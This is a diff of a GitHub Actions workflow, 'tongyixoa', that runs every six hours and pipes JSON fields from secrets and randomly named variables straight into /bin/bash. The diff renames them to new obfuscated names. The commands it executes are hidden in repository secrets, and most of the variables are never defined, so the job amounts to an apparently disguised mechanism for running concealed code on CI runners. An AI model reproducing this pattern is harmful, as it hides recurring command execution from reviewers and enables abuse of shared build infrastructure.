@@ -3,27 +3,30 @@ name: tongyixoa
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
+    - cron: '14 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tongyixoa
         env:
-          fanjz83: ${{ secrets.fanjz83 }}
+          uf3721: ${{ secrets.uf3721 }}
         run: |
-          echo $fanjz83 | jq -r .ahwy71047 | /bin/bash
-          echo $vmbr2575 | jq -r .bh10 | /bin/bash
-          echo $vbt56339 | jq -r .e099 | /bin/bash
-          echo $hmsz16 | jq -r .ruywb3681 | /bin/bash
-          echo $dwiq49213 | jq -r .txwwy0 | /bin/bash
-          echo $lj48 | jq -r .ixzqf253 | /bin/bash
-          echo $qh24168 | jq -r .wwuuh12 | /bin/bash
-          echo $vdb7 | jq -r .ude055 | /bin/bash
-          echo $swpe4406 | jq -r .yg10 | /bin/bash
-          echo $e80 | jq -r .hdq5 | /bin/bash
-          echo $w9 | jq -r .nc68 | /bin/bash
-          echo $sqhk319 | jq -r .voi0 | /bin/bash
+          echo $uf3721 | jq -r .wk2 | /bin/bash
+          echo $jcl75 | jq -r .xrsj5244 | /bin/bash
+          echo $vjf5 | jq -r .bduae078 | /bin/bash
+          echo $iyzim316 | jq -r .wbojp4 | /bin/bash
+          echo $ib7886 | jq -r .akelg84603 | /bin/bash
+          echo $ph52980 | jq -r .bo480 | /bin/bash
+          echo $pflq35044 | jq -r .dq3524 | /bin/bash
+          echo $pei31 | jq -r .o24 | /bin/bash
+          echo $g343 | jq -r .ot202 | /bin/bash
+          echo $a46 | jq -r .tns4 | /bin/bash
+          echo $k32 | jq -r .vmbl2194 | /bin/bash
+          echo $sqxun01453 | jq -r .tbyw178 | /bin/bash
+          echo $e63414 | jq -r .fj330 | /bin/bash
+          echo $qfeo32 | jq -r .fuc02 | /bin/bash
+          echo $ae4 | jq -r .rtpj1961 | /bin/bash
+          echo $t01 | jq -r .qwxap959 | /bin/bash
 
